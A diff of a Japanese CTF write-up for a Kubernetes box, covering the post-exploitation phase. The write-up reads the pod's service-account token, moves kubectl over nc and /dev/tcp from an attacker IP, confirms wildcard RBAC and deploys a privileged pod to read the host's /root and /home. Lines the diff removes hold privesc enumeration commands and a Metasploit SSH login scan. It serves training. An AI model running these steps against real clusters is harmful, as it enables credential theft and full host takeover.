@@ -142,103 +142,153 @@ gid=0(root)
 groups=
 ```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-## 続きは後日
-
+トークン
 
 ```sh
-# env_keep+=LD_PRELOAD は見落としがちなので注意
-sudo -l
+# ls -al /var/run/secrets/kubernetes.io/serviceaccount
+total 4
+drwxrwxrwt 3 root root  140 Dec 20 00:39 .
+drwxr-xr-x 3 root root 4096 Dec 20 00:39 ..
+drwxr-xr-x 2 root root  100 Dec 20 00:39 ..2025_12_20_00_39_00.3154405770
+lrwxrwxrwx 1 root root   32 Dec 20 00:39 ..data -> ..2025_12_20_00_39_00.3154405770
+lrwxrwxrwx 1 root root   13 Dec 20 00:39 ca.crt -> ..data/ca.crt
+lrwxrwxrwx 1 root root   16 Dec 20 00:39 namespace -> ..data/namespace
+lrwxrwxrwx 1 root root   12 Dec 20 00:39 token -> ..data/token
 ```
 
 ```sh
-find / -perm -u=s -type f -ls 2>/dev/null
+# cat /var/run/secrets/kubernetes.io/serviceaccount/token
+ey[REDACTED]
+```
+
+k8s環境
+
+```sh
+# env | grep KUBERNETES
+KUBERNETES_SERVICE_PORT=443
+KUBERNETES_PORT=tcp://10.152.183.1:443
+KUBERNETES_PORT_443_TCP_ADDR=10.152.183.1
+KUBERNETES_PORT_443_TCP_PORT=443
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+KUBERNETES_SERVICE_PORT_HTTPS=443
+KUBERNETES_PORT_443_TCP=tcp://10.152.183.1:443
+KUBERNETES_SERVICE_HOST=10.152.183.1
+```
+
+失敗。HTTPSのところにHTTPを送ったため。
+
+```sh
+# bash -c 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token);exec 3<>/dev/tcp/10.152.183.1/443;printf "GET /api HTTP/1.1\r\nHost: 10.152.183.1\r\nAuthorization: Bearer %s\r\n\r\n" "$TOKEN" >&3;cat <&3'
+HTTP/1.0 400 Bad Request
+
+Client sent an HTTP request to an HTTPS server.
+cat: -: Connection reset by peer
+```
+
+kubectlをコピー
+
+```sh
+curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
 ```
 
 ```sh
-find / -user <name> -type f -not -path "/proc/*" 2>/dev/null
-find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
+nc -lvnp 4444 < kubectl
+
+bash -c 'cat < /dev/tcp/192.168.138.236/4444 > kubectl'
+```
+
+## kubectl
+
+```sh
+# ./kubectl get pods --token=$TOKEN
+NAME                          READY   STATUS        RESTARTS       AGE
+php-deploy-6d998f68b9-wlslz   1/1     Terminating   4 (166d ago)   3y274d
+php-deploy-6d998f68b9-jgljv   1/1     Running       0              18m
+```
+
+権限は無制限
+
+```sh
+# ./kubectl auth can-i --list --token=$TOKEN
+Resources   Non-Resource URLs   Resource Names   Verbs
+*.*         []                  []               [*]
+            [*]                 []               [*]
+```
+
+無制限Podをデプロイ
+
+```sh
+# ./kubectl apply -f privesc.yml --token=${TOKEN}
+pod/everything-allowed-exec-pod created
+
+# ./kubectl get pods --token=$TOKEN
+NAME                          READY   STATUS        RESTARTS       AGE
+php-deploy-6d998f68b9-wlslz   1/1     Terminating   4 (166d ago)   3y274d
+php-deploy-6d998f68b9-jgljv   1/1     Running       0              22m
+everything-allowed-exec-pod   1/1     Running       0              14s
+```
+
+大元のシェルがWebシェルでありTTYが無いためエラーが出た
+
+```sh
+# ./kubectl exec -it everything-allowed-exec-pod --token=${TOKEN} -- /bin/bash
+Unable to use a TTY - input is not a terminal or the right kind of file
+```
+
+単発コマンド実行を使い、ホストの /root を見ることに成功
+
+```sh
+# ./kubectl exec everything-allowed-exec-pod --token=${TOKEN} -- ls -al /host/root
+total 32
+drwx------  5 root root 4096 Jul  6 08:25 .
+drwxr-xr-x 20 root root 4096 Dec 20 01:38 ..
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwx------  2 root root 4096 Jul  6 08:24 .cache
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+drwx------  2 root root 4096 Jul  6 08:20 .ssh
+-rw-------  1 root root    0 Jul  6 08:25 .viminfo
+-rw-r--r--  1 root root   32 Mar 20  2022 root.txt
+drwx------  4 root root 4096 Mar 20  2022 snap
+```
+
+ユーザーフラグを入手して終わり
+
+```sh
+# ./kubectl exec everything-allowed-exec-pod --token=${TOKEN} -- ls -al /host/home
+total 20
+drwxr-xr-x  5 root root 4096 Dec 20 01:38 .
+drwxr-xr-x 20 root root 4096 Dec 20 01:38 ..
+drwxr-xr-x  6 1000 1000 4096 Mar 21  2022 herby
+drwxr-xr-x  2 1001 1001 4096 Jul  6 07:56 ssm-user
+drwxr-xr-x  3 1002 1003 4096 Dec 20 01:38 ubuntu
 ```
 
 ```sh
-getcap -r / 2>/dev/null
-ls -al /var/backups
-cat /etc/crontab
-cat /etc/exports
+# ./kubectl exec everything-allowed-exec-pod --token=${TOKEN} -- ls -al /host/home/herby
+total 56
+drwxr-xr-x 6 1000 1000 4096 Mar 21  2022 .
+drwxr-xr-x 5 root root 4096 Dec 20 01:38 ..
+lrwxrwxrwx 1 1000 1000    9 Mar 21  2022 .bash_history -> /dev/null
+-rw-r--r-- 1 1000 1000  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 1000 1000 3771 Feb 25  2020 .bashrc
+drwx------ 2 1000 1000 4096 Mar 20  2022 .cache
+drwxr-x--- 3 1000 1000 4096 Mar 20  2022 .kube
+-rw-r--r-- 1 1000 1000  807 Feb 25  2020 .profile
+-rw-r--r-- 1 1000 1000    0 Mar 20  2022 .sudo_as_admin_successful
+-rw------- 1 1000 1000 6290 Mar 21  2022 .viminfo
+drwxrwxr-x 2 1000 1000 4096 Dec 20 02:07 app
+-rw-rw-r-- 1 1000 1000  376 Mar 20  2022 deploy.yaml
+-rw-rw-r-- 1 1000 1000  585 Mar 21  2022 php-deploy.yaml
+drwx------ 3 1000 1000 4096 Mar 20  2022 snap
+-rw-rw-r-- 1 1000 1000   25 Mar 21  2022 user.txt
 ```
 
 ## 振り返り
 
--
--
+- PHP 8.1.0-dev はなんとなく既視感があったが、すぐには気づけなかった。
+- 今回一番困ったのは、ファイルをコピーする方法。bashを使ってコピーする方法を学んだ。
+- Podは必ずK8Sの環境情報を持っているので、kubectlバイナリをコピーするだけで使える。そこがdockerエスケープと大きく異なる点。
 
 ## Tags
 
-#tags:PHP脆弱性 #tags:Kubernetes #tags:
-
-```sh
-# 大分類（Linuxはタグ付けしない）
-Window Kerberos pwn pwn(Windows) Crypto puzzle ウサギの穴 LLM
-
-# 脆弱性の種類
-CVE-xxxx-yyyyy カーネルエクスプロイト
-ツール脆弱性 sudo脆弱性 PHP脆弱性 exiftool脆弱性 アプリケーション保存の認証情報
-
-# 攻撃の種類
-サービス LFI SSRF XSS SQLインジェクション 競合 フィルターバイパス アップロードフィルターバイパス ポートノッキング PHPフィルターチェーン レート制限回避 XSSフィルターバイパス　SSTIフィルターバイパス RequestCatcher プロンプトインジェクション Defender回避 リバースコールバック LD_PRELOAD セッションID AVバイパス UACバイパス AMSIバイパス
-
-# ツールなど
-docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git tmux john redis rsync pip potato ligolo-ng insmod pickle
-```
-
-## メモ
-
-### シェル安定化
-
-```shell
-# python が無くても、python3 でいける場合もある
-python -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-```
-
-### SSH
-
-ユーザー名、パスワード（スペース区切り）ファイルを使ってSSHスキャンする
-
-```sh
-msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.10.165.96; set USERPASS_FILE creds.txt; run; exit"
-```
-
-エラー
-
-```sh
-# no matching host key type found. Their offer: ssh-rsa,ssh-dss
-# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
--oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
-```
+#tags:PHP脆弱性 #tags:Kubernetes
